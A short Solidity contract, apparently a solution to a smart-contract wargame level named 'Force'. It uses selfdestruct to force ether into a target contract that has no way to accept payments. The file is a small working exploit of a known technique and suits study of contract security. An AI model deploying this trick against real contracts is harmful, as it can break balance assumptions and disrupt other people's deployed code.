// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

contract Attack {
    Force force;

    constructor(Force _force) {
        force = Force(_force);
    }

    function attack() public payable {

        // cast address to payable
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}